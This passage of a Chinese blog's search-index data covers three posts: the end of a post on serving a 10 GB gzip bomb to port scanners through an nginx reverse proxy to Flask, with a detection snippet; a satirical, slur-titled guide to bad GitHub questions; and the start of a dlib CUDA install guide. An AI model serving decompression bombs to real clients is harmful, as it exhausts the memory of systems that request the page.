nginx.conf\uff08\u90e8\u5206\uff09<pre><code>server {\nlisten 80 default_server;\nlisten [::]:80 default_server;\nserver_name _;\n\n# \u4f7f\u7528 zipbomb_server \u6765\u7528\u6b66\u529b\u89e3\u51b3\u626b\u63cf\u5668\u95ee\u9898 \nlocation / {\nproxy_set_header Host $host;\nproxy_set_header X-Real-IP $remote_addr;\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\nproxy_pass http://127.0.0.1:8082;\n}\n}\n\nserver {\nlisten 80;\nlisten [::]:80;\nserver_name localhost 127.0.0.1;\n\n...\n}\n</code></pre> <p>\u4e4b\u524d\u6211\u4eec\u662f <code>return 403;</code>\uff0c\u73b0\u5728\u6211\u4eec\u628a <code>default_server</code> \u6240\u5728\u7684 <code>server</code> \u6dfb\u52a0\u4e00\u4e2a <code>/</code> \u7684 <code>location</code>\uff0c\u5e76\u5c06\u539f\u6765\u8fd4\u56de403\u6539\u4e3a\u53cd\u4ee3\u5230 <code>127.0.0.1:8082</code>\u3002</p> <p>\u6ce8\u610f\u7b2c10\u884c\uff0c\u6211\u4eec\u9700\u8981\u5411\u53cd\u4ee3\u7684\u8bf7\u6c42\u5934\u4e2d\u653e\u4e0a\u4e00\u4e2a <code>X-Forwarded-For</code>\uff0c\u4ee5\u8868\u793a nginx \u5e2e\u52a9\u54ea\u4e2a\u5ba2\u6237\u7aef\u8fdb\u884c\u4e86\u53cd\u5411\u4ee3\u7406\u3002\u6b64\u65f6\u6211\u4eec\u7684 Flask \u670d\u52a1\u5668\u624d\u80fd\u77e5\u9053\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\u3002</p> <p>\u5982\u6b64\u4e00\u6765\uff0c\u6240\u6709\u901a\u8fc7\u6211\u4eec\u670d\u52a1\u5668\u7684\u516c\u7f51 IP \u5730\u5740\u8bbf\u95ee\u670d\u52a1\u566880\u7aef\u53e3\u7684\u8fde\u63a5\uff0c\u65e0\u8bba path \u4e3a\u5982\u4f55\uff0c\u5747\u4f1a\u88ab\u53cd\u4ee3\u5230 Flask \u670d\u52a1\u5668\u4e0a\uff0c\u7136\u540e Flask \u670d\u52a1\u5668\u8fd4\u56de\u4e00\u4e2a 10G \u7684 gzip \u70b8\u5f39\uff0c\u662f\u4e0d\u662f\u5f88\u70ab\u9177\uff1f</p>","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220421-use-gzip-bomb-against-scanner/#_6","title":"\u9884\u9632\u65b9\u6cd5","text":"<p>\u6700\u4e3b\u8981\u7684\u9884\u9632\u65b9\u6cd5\u5c31\u662f\u5728\u67e5\u770b\u54cd\u5e94\u5185\u5bb9\u4e4b\u524d\u68c0\u67e5\u54cd\u5e94\u7684\u539f\u59cb\u5927\u5c0f\u3002</p> <pre><code>import gzip\nimport io\nimport requests\nimport sys\n\nresp = requests.get(url)\n\ncompressed = resp.raw.read()\ncompressed_size = sys.getsizeof(compressed)\nwith gzip.open(io.BytesIO(compressed), 'rb') as g:\n    g.seek(0, 2)\n    origin_size = g.tell()\n\nprint(compressed_size, origin_size)\n</code></pre> <p>\u5176\u4e2d <code>origin_size</code> \u53cd\u6620\u7684\u662f\u8f7d\u8377\u89e3\u538b\u4e4b\u540e\u7684\u5927\u5c0f\uff0c<code>compressed_size</code> \u53cd\u6620\u7684\u662f\u8f7d\u8377\u538b\u7f29\u540e\u7684\u5927\u5c0f\uff08\u4e5f\u662f\u5b9e\u9645\u4f20\u8f93\u7684\u5927\u5c0f\uff09\uff0c\u5b83\u4eec\u7684\u5355\u4f4d\u90fd\u662f B\u3002</p> <p>\u5982\u679c\u53d1\u73b0\u8fd9\u4e24\u4e2a\u503c\u7684\u6bd4\u503c\u8fc7\u5927\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8f7d\u8377\u5f88\u6709\u53ef\u80fd\u662f\u538b\u7f29\u5305\u70b8\u5f39\u3002</p>","tags":["nginx","gzip-bomb","flask"]},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/","title":"\u5982\u4f55\u50cf\u4e00\u4e2a\u5f31\u667a\u4e00\u6837\u63d0\u95ee","text":"<p>\u8fd9\u7bc7\u6587\u7ae0\u81f4\u529b\u4e8e\u544a\u8bc9\u8bfb\u8005\u5982\u4f55\u50cf\u4e00\u4e2a\u5f31\u667a\u4e00\u6837\u63d0\u95ee\uff0c\u4ee5\u53ca\u5982\u4f55\u5728\u63d0\u95ee\u65f6\u6fc0\u6012\u4f60\u7684\u56de\u7b54\u8005\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u672c\u6587\u4e3b\u8981\u7684\u8ba8\u8bba\u91cd\u70b9\u662f \u201c\u5982\u4f55\u50cf\u4e00\u4e2a\u5f31\u667a\u201d\uff0c\u800c\u4e0d\u662f \u201c\u5982\u4f55\u6fc0\u6012\u4f60\u7684\u56de\u7b54\u8005\u201d\uff0c\u6545\u8bf8\u5982 <code>\u63d0\u95ee\u6001\u5ea6</code>\u3001<code>\u641c\u7d22\u5df2\u5b58\u5728\u7684 issue</code> \u7b49\u4e0d\u5728\u6b64\u6587\u7684\u8ba8\u8bba\u8303\u56f4\u5185\u3002</p>","tags":["github"]},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_1","title":"\u5f00\u5c40\u4e00\u53e5\u8bdd\uff0c\u5185\u5bb9\u5168\u9760\u731c","text":"<p>\u4e4b\u6240\u4ee5\u5c06\u5176\u653e\u5728\u8fd9\u7bc7\u535a\u5ba2\u4e2d\u6700\u663e\u773c\u7684\u4f4d\u7f6e\uff0c\u662f\u56e0\u4e3a\u8be5\u65b9\u6cd5\u662f\u6fc0\u6012\u56de\u7b54\u8005\u6700\u6709\u6548\u7684\u65b9\u6cd5\u3002</p> <p>\u8be5\u65b9\u6cd5\u7684\u5173\u952e\u5728\u4e8e\uff1a\u4e0d\u8981\u5728\u63d0\u95ee\u4e2d\u63d0\u4f9b\u4efb\u4f55\u5185\u5bb9\uff08\u4f8b\u5982\u590d\u73b0\u6b65\u9aa4\u3001\u65e5\u5fd7\u3001\u73af\u5883\u4ee5\u53ca\u8f6f\u4ef6\u7248\u672c\u7b49\uff09\uff0c\u8fd9\u4e9b\u5185\u5bb9\u5c06\u6709\u52a9\u4e8e\u56de\u7b54\u8005\u66f4\u597d\u5730\u7406\u89e3\u95ee\u9898\uff0c\u56e0\u800c\u65e0\u6cd5\u4f53\u73b0\u4f60\u662f\u4e00\u4e2a\u5f31\u667a\u3002</p> <p>\u4f8b 1</p> <p></p> <p></p> <p></p> <p><code>\u5f00\u5c40\u4e00\u53e5\u8bdd\uff0c\u5185\u5bb9\u5168\u9760\u731c</code> \u6709\u4e00\u4e2a\u5b6a\u751f\u5144\u5f1f\uff0c\u90a3\u5c31\u662f <code>\u5f00\u5c40\u4e00\u5f20\u56fe\uff0c\u5185\u5bb9\u5168\u9760\u731c</code>\uff0c\u4f8b\u5982\uff1a</p> <p>\u4f8b 2</p> <p></p> <p>\u63d0\u793a\uff1a\u7531\u4e8e\u4f60\u8ba4\u4e3a\u56de\u7b54\u8005\u7684\u601d\u8003\u9891\u7387\u6c38\u8fdc\u548c\u4f60\u662f\u76f8\u540c\u7684\uff0c\u6545\u5728\u63d0\u95ee\u65f6\u65e0\u9700\u82b1\u65f6\u95f4\u7ec4\u7ec7\u597d\u8bed\u8a00\uff0c\u8fd9\u79cd\u4e0d\u660e\u6240\u4ee5\u7684\u95ee\u9898\u53ef\u4ee5\u8d77\u5230\u706b\u4e0a\u6d47\u6cb9\u7684\u4f5c\u7528\u3002</p> <p>\u4f60\u4e5f\u8bb8\u4f1a\u89c1\u5230\u4e00\u4e9b\u63d0\u95ee\u8005\u5728\u63cf\u8ff0\u81ea\u5df1\u60f3\u8981\u7684\u529f\u80fd\u6216 bug \u7684\u884c\u4e3a\u65f6\u52a0\u5165\u4e00\u4e9b\u793a\u8303\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u6240\u8fdb\u884c\u7684\u64cd\u4f5c</li> <li>\u671f\u5f85\u7684\u7ed3\u679c</li> <li>\u5b9e\u9645\u7684\u7ed3\u679c</li> </ul> <p>\u8bf7\u4e0d\u8981\u5b66\u4e60\u4ed6\u4eec\uff0c\u56e0\u4e3a\u4ed6\u4eec\u4e0d\u662f\u5f31\u667a\u3002</p>","tags":["github"]},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_2","title":"\u8be2\u95ee\u4e0d\u53ef\u601d\u8bae\u7684\u9884\u5907\u77e5\u8bc6\u95ee\u9898","text":"<p>\u4e00\u822c\u6765\u8bf4\uff0c\u4efb\u4f55\u4e00\u4e2a\u9879\u76ee\u90fd\u662f\u5199\u7ed9\u6709\u4e00\u5b9a\u9884\u5907\u77e5\u8bc6\u7684\u7528\u6237\u7684\u3002\u8fd9\u4e9b\u6240\u8c13\u7684\u9884\u5907\u77e5\u8bc6\uff0c\u4e00\u822c\u662f\u6307\u4f7f\u7528\u8be5\u9879\u76ee\uff08\u6216\u8005\u90e8\u7f72\u3001\u8fd0\u884c\u3001\u4fee\u6539\u7b49\uff09\u6240\u9700\u7684\u6700\u57fa\u672c\u7684\u6280\u80fd\u3002\u6216\u8bb8\u5bf9\u4e8e\u4e0d\u540c\u6c34\u5e73\u7684\u4eba\u6765\u8bf4\uff0c\u8fd9\u4e9b\u6240\u8c13\u7684\u9884\u5907\u77e5\u8bc6\u6807\u51c6\u53ef\u80fd\u4e0d\u5c3d\u76f8\u540c\uff0c\u4f46\u662f\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u5730\u65b9\uff0c\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6\u662f\u516c\u8ba4\u7684\u3002</p> <ul> <li>\u4f8b\u5982\u5728\u4e16\u754c\u4e0a\u7edd\u5927\u90e8\u5206\u5f00\u6e90\u9879\u76ee\u4e2d\uff0c<code>\u82f1\u8bed</code> \u662f\u9884\u5907\u77e5\u8bc6</li> <li>\u4f8b\u5982\u5728\u4e00\u4e2a\u5b8c\u5168\u57fa\u4e8e Python \u7684\u9879\u76ee\u4e2d\uff0c<code>Python \u7684\u5b89\u88c5</code> \u662f\u9884\u5907\u77e5\u8bc6</li> <li>\u4f8b\u5982\u5728\u4e00\u4e2a\u7f51\u7edc\u76f8\u5173\u7684\u9879\u76ee\u4e2d\uff0c<code>IP \u5730\u5740\u548c\u7aef\u53e3</code> \u662f\u9884\u5907\u77e5\u8bc6</li> <li>\u4f8b\u5982\u5728\u4e00\u4e2a\u88ab\u7528\u4e8e\u7535\u8111\u7684\u9879\u76ee\u4e2d\uff0c<code>\u7535\u8111\u7684\u5f00\u5173\u673a</code> \u662f\u9884\u5907\u77e5\u8bc6</li> <li>\u4f8b\u5982\u5728\u6570\u5b66\u4e2d\uff0c<code>\u56db\u5219\u8fd0\u7b97</code> \u662f\u9884\u5907\u77e5\u8bc6</li> </ul> <p>\u5411\u5f31\u667a\u63d0\u4f9b\u8fd9\u4e9b\u6700\u57fa\u7840\u7684\u77e5\u8bc6\u663e\u7136\u4e0d\u662f\u793e\u533a\u7684\u4e49\u52a1\u4e4b\u4e00\uff0c\u56e0\u6b64\u5982\u679c\u4f60\u60f3\u8ba9\u56de\u7b54\u8005\u8ba4\u4e3a\u4f60\u662f\u4e00\u4e2a\u5f31\u667a\uff08\u6216\u8005\u8bf4\uff0c\u53d6\u60a6\u4f60\u7684\u56de\u7b54\u8005\uff09\uff0c\u90a3\u4e48\u5f53\u4f60\u9047\u5230\u8fd9\u4e9b\u95ee\u9898\u65f6\uff0c\u4f60\u5e94\u8be5\u7acb\u5373\u8be2\u95ee\u4ed6\u4eec\uff0c\u800c\u4e0d\u662f\u82b1 5 \u5206\u949f\u81ea\u884c\u5b66\u4e60\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6\u3002\u4f8b\u5982\uff1a</p> <p>\u4f8b 3</p> <p>Q: apk \u662f\u4ec0\u4e48\uff1f\u5728\u54ea\u91cc\u4e0b\u8f7d\u554a\uff1f\u7cfb\u7edf\u7981\u6b62\u6211\u5b89\u88c5\u600e\u4e48\u529e\u554a\uff1f</p> <p>\u50cf\u4e0a\u8ff0\u8fd9\u79cd\u53ef\u4ee5\u7528\u4e00\u4e2a\u5e76\u4e0d\u590d\u6742\u7684\u53e5\u5b50\u63cf\u8ff0\u7684\u9884\u5907\u77e5\u8bc6\u95ee\u9898\uff0c\u4f60\u5927\u591a\u90fd\u662f\u53ef\u4ee5\u5728\u641c\u7d22\u5f15\u64ce\uff08\u4f8b\u5982 \u767e\u5ea6 \u6216\u8005 Google\uff09\u6216\u8005\u8bba\u575b\uff08\u5982 Stack Overflow\uff09\u4e0a\u627e\u5230\u8fd9\u4e9b\u95ee\u9898\u7684\u7b54\u6848\u7684\u3002</p> <p>\u5411\u4f60\u7684\u56de\u7b54\u8005\u8be2\u95ee\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6\u95ee\u9898\u6216\u8bb8\u4e5f\u662f\u4e00\u4e2a\u6fc0\u6012\u4ed6\u4eec\u7684\u65b9\u6848\uff0c\u8fd9\u53ef\u4ee5\u8ba9\u4ed6\u4eec\u89c9\u5f97\uff1a\u4e0e\u5176\u82b1\u65f6\u95f4\u4e3a\u8fd9\u4e2a\u5f31\u667a\u89e3\u51b3 \u600e\u4e48\u8ba9\u7535\u8111\u5173\u673a\u3001\u600e\u4e48\u4f7f\u7528\u9f20\u6807\u3001\u5982\u4f55\u4e3a\u624b\u673a\u5145\u7535 \u8fd9\u7c7b\u95ee\u9898\uff0c\u4e0d\u5982\u8ba9\u4ed6\u53bb\u641c\u7d22\u5f15\u64ce\u4e0a\u641c\u7d22\u7b54\u6848\u6765\u5f97\u5feb\u3002</p>","tags":["github"]},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_3","title":"\u5728\u67e5\u770b\u6587\u6863\u524d\u63d0\u51fa\u95ee\u9898","text":"<p>\u4e00\u4e9b\u5f00\u53d1\u8005\u53ef\u80fd\u4f1a\u5728\u81ea\u5df1\u7684\u9879\u76ee\u4e3b\u9875\u7684\u660e\u663e\u4f4d\u7f6e\u63d0\u4f9b\u6587\u6863\uff0c\u8fd9\u4e9b\u6587\u6863\u91cc\u53ef\u80fd\u63d0\u4f9b\u4e86\u4f60\u4f7f\u7528\u8be5\u9879\u76ee\u7684\u5fc5\u8981\u8bf4\u660e\u3002\u4f5c\u4e3a\u60f3\u8981\u6210\u4e3a\u5f31\u667a\u7684\u4eba\uff0c\u4f60\u5e94\u8be5\u4e0d\u8981\u82b1\u65f6\u95f4\u67e5\u770b\u8fd9\u4e9b\u6587\u6863\u3002</p> <p>\u5982\u4f55\u77e5\u9053\u81ea\u5df1\u5df2\u7ecf\u53d8\u6210\u5f31\u667a\uff1f\uff08\u6216\u8005\u8bf4\u5982\u4f55\u53d1\u73b0\u81ea\u5df1\u53ef\u80fd\u5df2\u7ecf\u6fc0\u6012\u4e86\u5176\u4ed6\u56de\u7b54\u8005\uff09</p> <p>\u5f53\u4f60\u53d1\u73b0\u81ea\u5df1\u7684\u56de\u7b54\u8005\u91cc\u6709\u4eba\u8ba9\u4f60\u53bb\u770b\u6587\u6863\u65f6\uff0c\u4f8b\u5982\uff1a</p> <p>\u4f8b 4</p> <p></p> <p>\u6b64\u65f6\u4f60\u5c31\u5df2\u7ecf\u53d8\u6210\u5f31\u667a\u4e86\u3002</p>","tags":["github"]},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_4","title":"\u8be2\u95ee\u4e0d\u76f8\u5173\u7684\u95ee\u9898","text":"<p>\u6ce8\u610f</p> <p>\u8fd9\u91cc\u7279\u6307 GitHub issue \u4e2d\u53ef\u80fd\u51fa\u73b0\u7684\u60c5\u5f62\u3002</p> <p>GitHub \u7684 issue \u662f\u7528\u4e8e\u5411\u4ed3\u5e93\u4e2d\u7684\u9879\u76ee\u63d0\u95ee\u3001\u53d1\u8d77\u5efa\u8bae\u6216\u5bfb\u6c42\u5e2e\u52a9\u7684\u5730\u65b9\u3002\u5982\u679c\u4f60\u60f3\u8ba9\u81ea\u5df1\u6210\u4e3a issue \u63d0\u95ee\u8005\u4e2d\u6700\u9753\u7684\u4ed4\uff0c\u4f60\u53ef\u4ee5\u5728 issue \u4e2d\u63d0\u51fa\u4e0e\u539f\u9879\u76ee\u6beb\u4e0d\u76f8\u5173\u7684\u95ee\u9898\u3002</p> <p>\u4f8b 5</p> <p>Q: requests.exceptions.Timeout: HTTPConnectionPool(host='google.com', ... \u662f\u4ec0\u4e48\u610f\u601d\uff1f</p> <p>A: \u5927\u9646\u8bbf\u95ee\u4e0d\u4e86\uff0c\u9700\u8981\u4f7f\u7528\u4ee3\u7406</p> <p>Q: \u4ece\u54ea\u91cc\u53ef\u4ee5\u641e\u5230\u4ee3\u7406\u554a\uff1f</p>","tags":["github"]},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_5","title":"\u81ea\u5df1\u9009\u62e9\u7684\u9053\u8def\u6c38\u8fdc\u662f\u6b63\u786e\u7684","text":"<p>\u5728\u63d0\u51fa\u95ee\u9898\u7684\u65f6\u5019\uff0c\u4f60\u7684\u8111\u6d77\u4e2d\u5e94\u5f53\u59cb\u7ec8\u8ba4\u4e3a \u201c\u81ea\u5df1\u9009\u62e9\u7684\u9053\u8def\u6c38\u8fdc\u662f\u6b63\u786e\u7684\u201d\uff0c\u56e0\u4e3a\u4f60\u65e0\u9700\u5411\u56de\u7b54\u8005\u63cf\u8ff0\u4f60\u7684\u6839\u672c\u95ee\u9898\u3002</p> <p>\u4e0e\u4e4b\u8bf4\u6cd5\u6700\u63a5\u8fd1\u7684\u662f <code>X-Y \u95ee\u9898</code> \uff0c\u8fd9\u6307\u7684\u662f\uff1a</p> <p>X-Y \u95ee\u9898</p> <p>\u4f60\u5728\u63d0\u95ee\u65f6\u53ef\u80fd\u6709\u4e00\u4e2a\u9ad8\u7ea7\u5c42\u6b21\u95ee\u9898 <code>X</code>\uff0c\u4f60\u89c9\u5f97\u89e3\u51b3\u4e86 <code>Y</code> \u8fd9\u4e2a\u4f4e\u7ea7\u5c42\u6b21\u95ee\u9898\u4fbf\u80fd\u89e3\u51b3 <code>X</code> \u8fd9\u4e2a\u9ad8\u7ea7\u5c42\u6b21\u95ee\u9898\u3002\u4e8e\u662f\u4f60\u5728\u793e\u533a\u8be2\u95ee <code>Y</code> \u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u6700\u7ec8\u793e\u533a\u5e2e\u4f60\u89e3\u51b3 <code>Y</code> \u95ee\u9898\u4e4b\u540e\uff0c\u53d1\u73b0 <code>Y</code> \u95ee\u9898\u7684\u89e3\u51b3\u5e76\u4e0d\u80fd\u5e2e\u52a9 <code>X</code> \u95ee\u9898\u7684\u89e3\u51b3\u3002</p> <p>\u5176\u6b21\uff0c\u4e0e\u63d0\u51fa <code>X-Y \u95ee\u9898</code> \u7c7b\u4f3c\u7684\u505a\u6cd5\u662f\u64c5\u81ea\u52a0\u5165\u989d\u5916\u7684\u731c\u6d4b\uff08\u53ef\u4ee5\u89c6\u4e3a\u662f\u4e00\u79cd \u201c\u663e\u5f0f\u201d \u7684 <code>X-Y \u95ee\u9898</code>\uff09\uff0c\u5e76\u8981\u6c42\u56de\u7b54\u8005\u89e3\u7b54\u5b83\uff0c\u4f8b\u5982\uff1a</p> <p>\u4f8b 6</p> <p>Q: XXX \u8fd9\u4e2a\u5730\u65b9\u62a5\u9519\u4e86\uff0c\u6211\u89c9\u5f97\u53ef\u80fd\u662f YYY \u7684\u95ee\u9898\uff0c\u80fd\u5e2e\u6211\u89e3\u51b3\u4e0b YYY \u5417\uff1f</p> <p>\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4f60\u4e0d\u4ec5\u53ef\u4ee5\u8ba9\u81ea\u5df1\u6210\u4e3a\u4e00\u4e2a\u5f31\u667a\uff0c\u8fd8\u53ef\u4ee5\u7981\u9522\u56de\u7b54\u8005\u7684\u601d\u7ef4\uff0c\u4ece\u800c\u96be\u4ee5\u5f97\u51fa\u6b63\u786e\u7684\u7b54\u6848\u3002</p>","tags":["github"]},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_6","title":"\u8bd5\u56fe\u8ba9\u56de\u7b54\u8005\u66ff\u4f60\u505a\u4e8b","text":"<p>\u5bf9\u4e8e\u5f31\u667a\u800c\u8a00\uff0c\u56de\u7b54\u8005\u6c38\u8fdc\u662f\u4ed6\u4eec\u7684\u5974\u96b6\u3002\u4f60\u53ef\u4ee5\u8981\u6c42\u56de\u7b54\u8005\u66ff\u4f60\u505a\u4e00\u4e9b\u4f60\u4e0d\u60f3\u4eb2\u81ea\u52a8\u624b\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982\uff1a</p> <p>\u4f8b 7</p> <p>Q: TCP + TLS + Web \u4e3a\u5565\u9700\u8981 Web \u524d\u9700\u8981 HAProxy \u554a\uff0cnginx \u4e5f\u6709\u8fd9\u79cd\u529f\u80fd\u554a \u975e\u8981\u524d\u9762 HAProxy\uff0c\u540e\u9762\u518d\u5f04\u4e2a nginx/httpd\u3002 \u5bf9\u4e8e\u4e2a\u4eba\u4f7f\u7528\u6ca1\u5fc5\u8981\u5427\u3002 \u5f53\u7136\u4f60\u642d\u5efa\u5546\u4e1a\u7684\u9664\u5916</p> <p>A: \u4e0d\u8981\u518d\u95ee\u8fd9\u79cd\u95ee\u9898\u4e86\uff0c\u4f60\u89c9\u5f97\u53ef\u4ee5\u5c31\u81ea\u5df1\u642d\uff0c\u642d\u6210\u4e86\u53ef\u4ee5\u5199\u7ed9\u6559\u7a0b pr</p> <p>Q: nginx \u7684 stream \u5757\u4e0d\u884c\u5417</p> <p>A: \u4e0d\u8981\u518d\u95ee\u8fd9\u79cd\u95ee\u9898\u4e86\uff0c\u4f60\u89c9\u5f97\u53ef\u4ee5\u5c31\u81ea\u5df1\u642d\uff0c\u642d\u6210\u4e86\u53ef\u4ee5\u5199\u7ed9\u6559\u7a0b pr</p>","tags":["github"]},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_7","title":"\u7528\u63cf\u8ff0\u9519\u8bef\u53d6\u4ee3\u63d0\u51fa\u95ee\u9898","text":"<p>\u80fd\u901a\u8fc7\u8fd9\u4e2a\u9014\u5f84\u6210\u4e3a\u5f31\u667a\u7684\u4eba\u5c11\u4e4b\u53c8\u5c11\uff0c\u56e0\u4e3a\u5f88\u5c11\u6709\u4eba\u80fd\u505a\u5230\u5728\u63d0\u51fa\u95ee\u9898\u7684\u65f6\u5019\u4ece\u4e0d\u4f7f\u7528 \u7591\u95ee\u53e5\u3002</p> <p>\u4f8b 8</p> <p>Q: \u6211\u628a\u540e\u7f00\u540d\u6539\u6210 zip\uff0c\u7136\u540e rar\u30017z \u4ec0\u4e48\u7684\u90fd\u8bd5\u8fc7\u4e86\uff0c\u8fd8\u662f\u4e0d\u884c</p> <p>A: \u80fd\u5426\u76f4\u63a5\u8bf4\u95ee\u9898\uff1f</p> <p>\u6ce8\u610f</p> <p>\u5982\u679c\u4f60\u771f\u7684\u662f\u4e3a\u4e86\u5355\u7eaf\u63cf\u8ff0\u9519\u8bef\uff08\u800c\u975e\u63d0\u51fa\u95ee\u9898\uff09\uff0c\u90a3\u4e48\u8fd9\u6761\u9014\u5f84\u4e0d\u9002\u7528\u4e8e\u4f60\uff0c\u56e0\u4e3a\u63cf\u8ff0\u9519\u8bef\u53ef\u4ee5\u4e0d\u4f7f\u7528\u7591\u95ee\u53e5\u3002</p>","tags":["github"]},{"location":"blog/2022/220429-dilb-ultimate-solution/","title":"\u57fa\u4e8e Anaconda \u7684 dlib\uff08CUDA \u7248\u672c\uff09\u5b89\u88c5\u7684\u7ec8\u6781\u89e3\u51b3\u65b9\u6848","text":"","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_1","title":"\u7eea\u8bba","text":"<p>\u5386\u65f6 14 \u4e2a\u5c0f\u65f6\uff0c\u53cd\u590d\u4e0b\u8f7d\u9ad8\u8fbe 60 GB\uff0c\u91cd\u65b0\u90e8\u7f72\u6574\u4e2a Visual Studio \u591a\u8fbe 5 \u6b21\uff0c\u4ece\u800c\u6253\u78e8\u51fa\u7684 dlib \u5b89\u88c5\u7ec8\u6781\u89e3\u51b3\u65b9\u6848\uff0c\u4e13\u6ce8\u4e8e\u89e3\u51b3 dlib \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u5404\u79cd\u7591\u96be\u6742\u75c7\u3002</p> <p>\u4f60\u662f\u5426\u6709\u4ee5\u4e0b\u82e6\u607c\uff1f</p> <ul> <li>You must use Visual Studio to build a python extension on Windows</li> <li>\u5bf9\u7740\u5341\u51e0\u4e2a GB \u7684 Visual Studio \u53d1\u6101</li> <li>Anaconda \u88c5\u4e0a\u7684 dlib \u6ca1\u6cd5\u8c03\u7528 GPU</li> <li>\u4e0d\u4ec5 GPU \u5360\u7528\u7387\u4e3a 0\uff0cCPU \u4e5f\u8dd1\u4e0d\u6ee1</li> <li>\u88c5\u4e0a\u4e86 Visual Studio\uff0c\u4ecd\u7136\u65e0\u6cd5\u7f16\u8bd1 dlib</li> <li>x64 \u548c x86 \u6253\u67b6</li> <li>\u51e0\u4e2a CMake \u4e00\u8d77\u6253\u67b6</li> <li>\u82f1\u4f1f\u8fbe CUDA \u9a71\u52a8\u5728 C \u76d8\u5230\u5904\u91ca\u653e\u6587\u4ef6\uff08lashi\uff09</li> <li>\u660e\u660e\u88c5\u4e86 CUDA\uff0cCMakeList \u5374\u4ee5\u5404\u79cd\u5404\u6837\u7684\u7406\u7531\u4e0d\u8ba9\u4f60\u7528</li> <li>\u4f8b\u5982\u5acc\u5f03\u4f60\u7684 CUDA \u7248\u672c\u592a\u9ad8\u6216\u592a\u4f4e</li> <li>\u4f8b\u5982\u5acc\u5f03\u4f60\u7684 Visual Studio \u7248\u672c\u592a\u9ad8\u6216\u592a\u4f4e</li> <li>CMakeList.txt \u7b2c 5 \u884c\u7ecf\u5178\u62a5\u9519</li> <li>Permission Denied</li> <li>Temp \u6587\u4ef6\u5939\u5199\u5165\u4e0d\u4e86\u4e86</li> <li>error C2734: \u201cGifAsciiTable8x8\u201d: \u5982\u679c\u4e0d\u662f\u5916\u90e8\u7684\uff0c\u5219\u5fc5\u987b\u521d\u59cb\u5316\u5e38\u91cf\u5bf9\u8c61</li> <li>error C2065: \u201cssize_t\u201d: \u672a\u58f0\u660e\u7684\u6807\u8bc6\u7b26</li> <li>\u5386\u7ecf\u5343\u8f9b\u4e07\u82e6\u88c5\u5b8c\u4e86\u7ed3\u679c\u8fd8\u662f <code>dlib.DLIB_USE_CUDA == False</code></li> <li>...</li> </ul> <p>\u88c5 dlib \u4e00\u76f4\u662f\u673a\u5668\u5b66\u4e60\u9886\u57df\u7684\u4e00\u4e2a\u5927\u96be\u9898\uff0c\u5b83\u8981\u6c42\u5f00\u53d1\u4eba\u5458\u62e5\u6709\u67d0\u4e9b\u7279\u5b9a\u7684 CUDA + Visual Studio + dlib + python \u7248\u672c\u7684\u7ec4\u5408\uff0c\u8fd9\u4e9b\u7ec4\u5408\u4e00\u65e6\u6709\u4e00\u4e2a\u73af\u8282\u51fa\u4e86\u95ee\u9898\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6574\u4e2a dlib \u6ca1\u6cd5\u7528\uff0c\u800c dlib \u53c8\u662f\u5f88\u591a\u5e93\uff08\u4f8b\u5982 face_recognition \uff09\u7684\u4f9d\u8d56\u5e93\u3002\u8fd9\u4e9b\u8270\u96be\u9669\u963b\u5c06\u6781\u5927\u5730\u6253\u51fb\u5f00\u53d1\u4eba\u5458\u5728\u673a\u5668\u5b66\u4e60\u9886\u57df\u653b\u575a\u7684\u4fe1\u5fc3\u3002</p> <p>\u5373\u4f7f\u662f\u6709 <code>\u4e07\u80fd</code> \u4e4b\u79f0\u7684 Anaconda \uff0c\u5b83\u4e5f\u4e0d\u80fd\u5b8c\u5168\u8fd9\u4e2a\u95ee\u9898\u3002\u56e0\u4e3a\u5b83\u4e0b\u8f7d\u7684 dlib \u6ca1\u6709\u63d0\u4f9b GPU \u652f\u6301\uff0c\u8fd9\u76f4\u63a5\u9020\u6210\u4e86 <code>\u4e00\u6838\u6709\u96be\uff0c\u4e07\u6838\u56f4\u89c2</code> \u7684\u7ecf\u5178\u5c40\u9762\u3002\u800c\u76ee\u524d\uff082022 \u5e74 4 \u6708\u5e95\uff09\u552f\u4e00\u80fd\u5728 Anaconda \u4ed3\u5e93\u4e2d\u627e\u5230\u7684\u6709\u5173 CUDA \u548c GPU \u7684\u8f6f\u4ef6\u5305\u53ea\u63d0\u4f9b\u4e86 Linux \u7684\u7f16\u8bd1\u7248\u672c\uff08zeroae/dlib-cuda \u548c hoan/dlib-gpu \uff09\u4e14\u5747\u5f88\u957f\u65f6\u95f4\u6ca1\u6709\u66f4\u65b0\u3002</p> <p>\u8fd9\u4f7f\u5f97\u624b\u5934\u6ca1\u6709 Visual Studio \u7684\u5f00\u53d1\u4eba\u5458\uff08\u5176\u5b9e\u5c31\u7b97\u6709 Visual Studio \u4e5f\u5dee\u4e0d\u591a\uff09\u5728 Windows \u5e73\u53f0\u4e0a\u5229\u7528 CNN\uff08\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\uff09\u8fdb\u884c\u4eba\u8138\u8bc6\u522b\u6216\u8005\u5176\u4ed6\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u65f6\uff0c\u7b80\u76f4\u548c\u5750\u7262\u4e00\u6837\u3002</p> 